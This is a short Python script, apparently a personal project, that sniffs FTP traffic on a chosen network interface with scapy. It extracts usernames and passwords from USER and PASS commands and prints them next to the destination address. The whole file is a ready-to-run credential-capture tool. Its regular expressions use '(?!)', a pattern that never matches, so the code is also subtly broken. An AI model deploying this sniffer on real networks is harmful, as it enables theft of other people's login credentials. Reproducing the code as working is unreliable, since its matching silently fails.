'''                                         '''

    ########################################
    #         FTP Sniffer Script           #
    #       Ahmad Reza Parsi Zadeh         #
    #        github: ahmad-reza-ut         #
    ########################################
import re

'''                                         '''



#------------- FTP Sniffer -------------#
# Importing necessary libraries
from Imports import *

#------------------ Main ------------------#
def main():
    parser = optparse.OptionParser('UsageOf The Program: ' + '-i<interface>')
    parser.add_option('-i', dest = 'interface',type = 'string', help = 'specify interface to listen on' )
    (options, args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        sniff(filter = 'tcp port 21', prn = FTP_Sniffer)
    except KeyboardInterrupt:
        exit(0)

# ----------------------------#
def FTP_Sniffer(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?!)USER (.*)', raw)
    password = re.findall('(?!)PASS(.*)', raw)
    if user:
        print('[*] Detected FTP Login To: ' + str(dest))
        print('[+] User Account: ' + str(user[0]))
    elif password:
        print('[+] Password: ' + str(password[0]))
# ----------------------------#
if __name__ == "__main__":
    main()

#---------------- END ----------------#